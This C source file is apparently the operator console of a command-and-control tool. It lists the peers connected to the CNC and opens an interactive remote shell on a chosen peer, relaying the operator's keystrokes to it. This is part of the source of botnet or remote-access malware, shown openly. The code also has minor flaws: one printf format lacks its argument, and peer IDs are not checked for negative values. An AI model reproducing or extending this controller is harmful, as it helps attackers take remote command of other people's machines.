#include <setjmp.h>

#include "lmem.h"
#include "sclient.h"
#include "speer.h"
#include "scmd.h"
#include "sterm.h"
#include "lerror.h"

#define CMD_ERROR(...) do { \
    shellT_printf("[ERROR] : " __VA_ARGS__); \
    longjmp(cmdE_err, 1); \
} while(0);

jmp_buf cmdE_err;

/* ===========================================[[ Helper Functions ]]============================================= */

tShell_cmdDef *shellS_findCmd(char *cmd);

tShell_peer *shellS_getPeer(tShell_client *client, int id) {
    if (id >= client->peerTblCount)
        CMD_ERROR("Not a valid peer ID! [%d]\n", id);
    
    return client->peerTbl[id];
}

int shellS_readInt(char *str) {
    return atoi(str);
}

/* ===========================================[[ Command Handlers ]]============================================= */

void helpCMD(tShell_client *client, int args, char *argc[]);

void listPeers(tShell_client *client, int args, char *argc[]) {
    int i;

    shellT_printf("\n");
    for (i = 0; i < client->peerTblCount; i++) {
        if (client->peerTbl[i]) {
            shellT_printf("\n%04d ", i);
            shellC_printInfo(client->peerTbl[i]);
        }
    }
    shellT_printf("\n");
}

void openShell(tShell_client *client, int args, char *argc[]) {
    uint8_t buf[LAIKA_SHELL_DATA_MAX_LENGTH];
    tShell_peer *peer;
    int id, sz, cols, rows;

    if (args < 2)
        CMD_ERROR("Usage: shell [PEER_ID]\n");

    id = shellS_readInt(argc[1]);
    peer = shellS_getPeer(client, id);

    shellT_printf("\n\nOpening shell on peer %04d...\n\n");

    /* open shell on peer */
    shellT_getTermSize(&cols, &rows);
    shellC_openShell(client, peer, cols, rows);

    /* while client is alive, and our shell is open */
    while (laikaS_isAlive((&client->peer->sock)) && shellC_isShellOpen(client)) {
        /* poll for 50ms */
        if (!shellC_poll(client, 50)) {
            /* check if we have input! */
            if (shellT_waitForInput(0)) {
                /* we have input! send SHELL_DATA packet */
                sz = shellT_readRawInput(buf, sizeof(buf));
                if (sz <= 0) /* sanity check */
                    break;

                shellC_sendDataShell(client, buf, sz);
            }
        }
    }

    /* fix terminal */
    shellT_resetTerm();
    shellT_conioTerm();

    shellT_printf("\n\nShell closed\n\n");
}

/* =============================================[[ Command Table ]]============================================== */

#define CREATECMD(_cmd, _help, _callback) ((tShell_cmdDef){.cmd = _cmd, .help = _help, .callback = _callback})

tShell_cmdDef shellS_cmds[] = {
    CREATECMD("help", "Lists avaliable commands", helpCMD),
    CREATECMD("list", "Lists all connected peers to CNC", listPeers),
    CREATECMD("shell", "Opens a shell on peer", openShell),
};

#undef CREATECMD

tShell_cmdDef *shellS_findCmd(char *cmd) {
    int i;

    /* TODO: make a hashmap for command lookup */
    for (i = 0; i < (sizeof(shellS_cmds)/sizeof(tShell_cmdDef)); i++) {
        if (strcmp(shellS_cmds[i].cmd, cmd) == 0)
            return &shellS_cmds[i]; /* cmd found */
    }

    return NULL;
}

void helpCMD(tShell_client *client, int args, char *argc[]) {
    int i;

    shellT_printf("\n\n=== [[ Command List ]] ===\n\n");
    for (i = 0; i < (sizeof(shellS_cmds)/sizeof(tShell_cmdDef)); i++) {
        shellT_printf("%04d '%s'\t- %s\n", i, shellS_cmds[i].cmd, shellS_cmds[i].help);
    }
    shellT_printf("\n");
}

void shellS_initCmds(void) {
    /* stubbed for now, TODO: setup command hashmap */
}

void shellS_cleanupCmds(void) {
    /* stubbed for now, TODO: free command hashmap */
}

char **shellS_splitCmd(char *cmd, int *argSize) {
    int argCount = 0;
    int argCap = 4;
    char **args = NULL;
    char *arg = cmd;

    do {
        /* replace space with NULL terminator */
        if (arg != cmd)
            *arg++ = '\0';

        /* insert into our 'args' array */
        laikaM_growarray(char*, args, 1, argCount, argCap);
        args[argCount++] = arg;
    } while ((arg = strchr(arg, ' ')) != NULL); /* while we still have a delimiter */

    *argSize = argCount;
    return args;
}

void shellS_runCmd(tShell_client *client, char *cmd) {
    tShell_cmdDef *cmdDef;
    char **argc;
    int args;

    argc = shellS_splitCmd(cmd, &args);

    /* find cmd */
    if ((cmdDef = shellS_findCmd(argc[0])) == NULL) {
        shellT_printf("\nUnknown command '%s'!\n\n", cmd);
        return;
    }

    /* run command */
    if (setjmp(cmdE_err) == 0) {
        cmdDef->callback(client, args, argc);
    }

    /* free our argument buffer */
    laikaM_free(argc);
}
